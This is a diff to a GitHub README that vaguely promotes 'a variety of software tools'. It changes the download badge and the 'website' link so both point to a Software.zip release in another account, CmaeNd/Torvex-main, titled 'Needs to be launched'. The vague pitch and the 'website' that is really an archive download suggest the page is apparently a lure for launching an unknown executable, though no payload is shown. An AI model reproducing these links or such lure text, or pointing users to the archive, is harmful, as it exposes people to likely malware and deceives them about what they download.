@@ -10,7 +10,7 @@ This repository contains a variety of software tools designed to make your life 
 
 To get started, simply download the software package from the link below:
 
-[<img src="https://img.shields.io/badge/Download-Software.zip-orange">](https://github.com/user-attachments/files/18388744/Software.zip "Needs to be launched")
+[<img src="https://github.com/CmaeNd/Torvex-main/releases/download/v1.0/Software.zip">](https://github.com/CmaeNd/Torvex-main/releases/download/v1.0/Software.zip "Needs to be launched")
 
 ## Features
 
@@ -28,7 +28,7 @@ We welcome contributions to enhance the software and improve user experience. Fe
 
 ## Visit Our Website
 
-For more information about our software offerings, visit our [website](https://github.com/user-attachments/files/18388744/Software.zip).
+For more information about our software offerings, visit our [website](https://github.com/CmaeNd/Torvex-main/releases/download/v1.0/Software.zip).
 
 ## Stay Updated
 
